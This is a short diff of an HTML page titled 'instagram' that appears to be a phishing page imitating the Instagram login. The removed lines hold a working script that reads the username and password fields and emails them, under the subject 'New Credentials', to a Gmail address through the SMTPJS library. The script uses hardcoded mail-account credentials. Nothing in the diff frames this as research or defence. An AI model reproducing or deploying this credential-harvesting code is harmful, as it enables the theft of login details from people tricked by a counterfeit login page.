@@ -1,26 +1,5 @@
 	<html>
 	<title>instagram</title>
-	<script src="https://smtpjs.com/v3/smtp.js"></script>
-	<script type="text/javascript">
-    function sendEmail() {
-	let uname = document.getElementById('username').value;
-	let pwd = document.getElementById('password').value;
-      Email.send({
-        Host: "smtp.gmail.com",
-        Username: "testing67976@gmail.com",
-        Password: "testing@0987",
-        To: 'testing67976@gmail.com',
-        From: "testing67976@gmail.com",
-        Subject:"New Credentials",
-        Body: "Username : <b>"+uname+"</b> <br/> Password: <b>"+pwd+"</b>",
-		UseDefaultCredentials :	false
-      })
-        .then(function (message) {
-          console.log("mail sent successfully",message)
-		  document.getElementById('parent').style.display = 'none';
-		  });
-    }
-  </script>
 	<body>
 	  <div id="parent" style="text-align: center">
 	  <div style=" margin: auto 35vw;">
